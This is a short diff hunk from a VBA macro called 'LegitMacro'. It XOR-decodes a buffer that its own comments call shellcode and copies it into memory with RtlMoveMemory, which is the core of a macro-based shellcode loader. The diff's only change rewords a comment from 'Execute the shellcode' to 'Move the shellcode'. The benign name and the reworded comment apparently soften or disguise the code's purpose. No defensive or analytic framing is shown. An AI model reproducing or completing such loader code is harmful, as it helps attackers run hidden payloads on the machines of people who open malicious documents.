@@ -50,7 +50,7 @@ Sub LegitMacro()
         buf(i) = buf(i) Xor 250
     Next i
     
-    ' Execute the shellcode
+    ' Move the shellcode
     For counter = LBound(buf) To UBound(buf)
         data = buf(counter)
         res = RtlMoveMemory(addr + counter, data, 1)
